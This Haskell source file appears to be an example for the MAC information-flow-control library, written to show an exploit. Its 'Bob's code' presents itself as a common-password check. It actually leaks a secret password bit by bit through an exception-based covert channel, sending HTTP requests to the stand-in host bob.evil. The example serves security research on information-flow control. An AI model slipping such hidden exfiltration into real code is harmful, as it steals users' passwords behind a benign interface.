{-# LANGUAGE Safe #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# LANGUAGE FlexibleContexts #-}
module Examples.Bob3 where

import Data.Maybe
import Data.List

import MAC.MAC hiding (MAC)
import MAC.Lattice
import MAC.Labeled
import MAC.Control
import Control.Monad

import Control.Exception hiding (catch)

import Control.Monad.Catch

import qualified Examples.MACWget as Wget
import Data.List.Split
import Data.ByteString.Lazy.Char8 (unpack)

import Data.Bits
import Data.Char

type MAC m a = MACT m IO a

wgetMAC :: String -> MAC L String
wgetMAC = fmap unpack . Wget.wgetMAC

catchMAC :: Exception e => MAC l a -> (e -> MAC l a) -> MAC l a
catchMAC = catch

-- Bob's code
common_pass :: Labeled H String -> MAC L (Labeled H Bool)
common_pass lpass = do
  attack lpass
  str <- wgetMAC "http://www.openwall.com/passwords/wordlists/password-2011.lst"
  let lines = filter (not.null) (linesBy (=='\n') str)
  let words = filter ( not . (=='#') . head ) lines
  joinMAC $ do
     pass <- unlabel lpass
     return $ isJust $ find (== pass) words


charToByte :: Labeled H Char -> MAC L [Labeled H Bool]
charToByte lchar = do
  forM [0..8] g
       where g n = joinMAC $ do fix (labelOf lchar)
                                char <- unlabel lchar
                                return $ testBit (digitToInt char) n

toChars :: Labeled H String -> MAC L [Labeled H Char]
toChars lstr = do
  forM [0..39] g
       where g n = joinMAC $ do
                               fix (labelOf lstr)
                               str <- unlabel lstr
                               return $ if (n >= length str) then (chr 0)
                                        else str !! n

attack :: Labeled H String -> MAC L ()
attack lpass = toChars lpass >>= mapM charToByte >>= mapM leakByte
               >> return ()


leakByte :: [Labeled H Bool] -> MAC L ()
leakByte lbools = forM (zip lbools [0..7]) (uncurry leakBit) >> return ()

leakBit :: Labeled H Bool -> Int -> MAC L ()
leakBit lbool n = do
  wgetMAC $ "http://bob.evil/bit=" ++ show n
  catchMAC (crashOnTrue lbool)
           (\(e :: SomeException) -> wgetMAC "http://bob.evil/set=1" >> return ())

crashOnTrue :: Labeled H Bool -> MAC L ()
crashOnTrue lbool = do
  joinMAC $ do fix (labelOf lbool)
               bool <- unlabel lbool
               when (bool == True) $ error "crash!"
  wgetMAC $ "http://bob.evil/set=0"
  return ()
